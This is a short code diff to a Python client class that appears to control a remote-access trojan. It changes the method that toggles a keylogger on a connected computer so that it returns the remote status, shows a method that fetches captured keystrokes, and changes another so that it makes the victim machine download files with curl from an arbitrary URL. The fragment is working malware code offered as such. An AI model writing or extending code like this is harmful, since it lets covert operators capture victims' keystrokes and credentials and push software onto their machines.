@@ -63,7 +63,7 @@ class Client:
             output = self.conn.recv(header).decode(FORMAT)
             return output
 
-    def deployKeylogger(self) -> bool:
+    def deployKeylogger(self) -> str:
         """
         Returns a boolean values indicating whether keylogger is enabled or disabled
         :return:
@@ -72,6 +72,9 @@ class Client:
         self.send("toggle")
 
         # Get status
+        status: str = self.conn.recv(1024).decode(FORMAT)
+        return status
+
 
     def getKeyloggerOutput(self) -> list[str]:
         """
@@ -97,12 +100,13 @@ class Client:
 
     def downloadSoftware(self, url: str) -> str:
         """
-        Downloads file onto computer and returns output from other computer
+        Downloads file onto computer and returns filename of file
         :param url:
         :return:
         """
         filename: str = self.getFilenameFromUrl(url)
-        return self.command(f"curl {url} -O {filename}")
+        self.command(f"curl {url} -O {filename}")
+        return filename
 
     def deploySoftware(self, command: str):
         """
